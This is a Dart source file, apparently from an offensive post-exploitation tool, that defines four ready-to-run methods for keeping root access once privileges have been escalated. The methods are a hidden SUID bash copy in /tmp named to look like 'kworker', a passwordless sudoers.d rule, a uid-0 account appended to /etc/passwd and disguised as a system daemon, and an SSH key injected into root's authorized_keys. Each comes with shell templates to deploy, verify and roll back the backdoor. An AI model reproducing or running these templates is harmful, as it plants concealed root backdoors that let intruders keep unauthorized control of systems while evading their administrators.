/// How strongly a landing method's `verify` command actually proves root.
enum LandingVerifyStrength {
  /// The verify command itself runs as uid=0(root) (SUID shell, sudoers).
  executable,

  /// The verify command can only confirm the backdoor artifact exists, because
  /// the real proof (`su`, `ssh`) needs an interactive TTY this channel lacks.
  structural,
}

/// A user-fillable parameter for a landing method's `{param}` placeholders.
class LandingParam {
  const LandingParam({
    required this.id,
    required this.label,
    required this.hint,
    required this.defaultValue,
  });

  final String id;
  final String label;
  final String hint;
  final String defaultValue;
}

/// A way to persist a reusable root entry after escalation succeeds.
///
/// Every landing's [deployTemplate] runs **as root** (euid 0), drops the
/// backdoor, and ends with `echo DEPLOY_OK`. Because each `executeCommand` is a
/// fresh non-interactive shell, the escalation primitive must drop the landing
/// in the same shot — hence the deploy command is self-contained.
class LandingMethod {
  const LandingMethod({
    required this.id,
    required this.name,
    required this.description,
    required this.params,
    required this.deployTemplate,
    required this.verifyTemplate,
    required this.rollbackTemplate,
    required this.verifyStrength,
  });

  final String id;
  final String name;
  final String description;
  final List<LandingParam> params;

  /// Runs as root; uses `{param}` placeholders; ends with `DEPLOY_OK`.
  final String deployTemplate;

  /// Follow-up command proving the backdoor yields root. Emits `VERIFY_OK:…`
  /// or raw `uid=0(root)` / `euid=0(root)`.
  final String verifyTemplate;

  final String rollbackTemplate;
  final LandingVerifyStrength verifyStrength;
}

/// The canonical four landing methods.
const List<LandingMethod> landingMethods = [
  // ── SUID root shell ────────────────────────────────────────────────────────
  LandingMethod(
    id: 'suid_shell',
    name: 'SUID root shell',
    description: '隐藏路径复制 /bin/bash 并设 SUID，之后 /tmp/.{mimic} -p 即 root。',
    params: [
      LandingParam(
        id: 'mimic',
        label: '隐藏文件名',
        hint: '如 kworker、dbus-daemon、systemd-coredump',
        defaultValue: 'kworker',
      ),
    ],
    deployTemplate:
        r'''cp /bin/bash /tmp/.{mimic} && chmod 4755 /tmp/.{mimic} && echo DEPLOY_OK''',
    verifyTemplate: r'''/tmp/.{mimic} -p -c 'id' ''',
    rollbackTemplate: r'''rm -f /tmp/.{mimic}''',
    verifyStrength: LandingVerifyStrength.executable,
  ),

  // ── sudoers NOPASSWD ───────────────────────────────────────────────────────
  LandingMethod(
    id: 'sudoers_nopasswd',
    name: 'sudoers NOPASSWD',
    description: '写入 /etc/sudoers.d 让当前用户免密执行任意命令，sudo -n -i 即 root。',
    params: [
      LandingParam(
        id: 'user',
        label: '目标用户名',
        hint: '留空则使用扫描捕获的当前用户',
        defaultValue: '',
      ),
      LandingParam(
        id: 'name',
        label: '文件名',
        hint: 'sudoers.d 下的文件名',
        defaultValue: 'zz-mx',
      ),
    ],
    deployTemplate:
        r'''echo "{user} ALL=(ALL:ALL) NOPASSWD: ALL" > /etc/sudoers.d/99-{name} && chmod 440 /etc/sudoers.d/99-{name} && (visudo -c >/dev/null 2>&1 && echo DEPLOY_OK || (rm -f /etc/sudoers.d/99-{name} && echo DEPLOY_FAILED))''',
    verifyTemplate: r'''sudo -n id''',
    rollbackTemplate: r'''rm -f /etc/sudoers.d/99-{name}''',
    verifyStrength: LandingVerifyStrength.executable,
  ),

  // ── UID-0 passwd user ──────────────────────────────────────────────────────
  LandingMethod(
    id: 'passwd_user',
    name: 'UID-0 passwd 用户',
    description: '向 /etc/passwd 追加 uid=0 的登录用户，之后 su 登录即 root。',
    params: [
      LandingParam(
        id: 'username',
        label: '用户名',
        hint: '伪装成系统守护进程，如 messagebus、daemon',
        defaultValue: 'messagebus',
      ),
      LandingParam(
        id: 'password',
        label: '密码',
        hint: '后门用户的登录密码',
        defaultValue: 'REPLACE_PASSWORD',
      ),
      LandingParam(
        id: 'salt',
        label: 'crypt 盐值',
        hint: '2 字符随机盐',
        defaultValue: 'AA',
      ),
    ],
    deployTemplate:
        r'''H=$(openssl passwd -6 -salt {salt} '{password}' 2>/dev/null || perl -e 'print crypt("{password}","{salt}")' 2>/dev/null || ruby -e 'print "{password}".crypt("{salt}")'); echo "{username}:$H:0:0:root:/root:/bin/bash" >> /etc/passwd && echo DEPLOY_OK''',
    verifyTemplate:
        r'''grep -q '^{username}:.*:0:0:' /etc/passwd && echo VERIFY_OK''',
    rollbackTemplate:
        r'''cp /etc/passwd /etc/passwd.bak && sed -i '/^{username}:/d' /etc/passwd''',
    verifyStrength: LandingVerifyStrength.structural,
  ),

  // ── root authorized_keys ───────────────────────────────────────────────────
  LandingMethod(
    id: 'root_authorized_keys',
    name: 'root authorized_keys',
    description: '把公钥注入 /root/.ssh/authorized_keys，SSH 免密登录 root。',
    params: [
      LandingParam(
        id: 'pubkey',
        label: 'SSH 公钥',
        hint: 'ssh-rsa AAAA… user@host',
        defaultValue: '',
      ),
      LandingParam(
        id: 'fingerprint',
        label: '公钥指纹片段',
        hint: '用于验证/回滚的唯一片段，如最后一段注释',
        defaultValue: '',
      ),
    ],
    deployTemplate:
        r'''mkdir -p /root/.ssh && echo '{pubkey}' >> /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys && echo DEPLOY_OK''',
    verifyTemplate:
        r'''grep -qF '{fingerprint}' /root/.ssh/authorized_keys && echo VERIFY_OK''',
    rollbackTemplate:
        r'''grep -vF '{fingerprint}' /root/.ssh/authorized_keys > /root/.ssh/authorized_keys.tmp && mv /root/.ssh/authorized_keys.tmp /root/.ssh/authorized_keys''',
    verifyStrength: LandingVerifyStrength.structural,
  ),
];

/// Look up a landing method by id.
LandingMethod landingById(String id) =>
    landingMethods.firstWhere((m) => m.id == id);
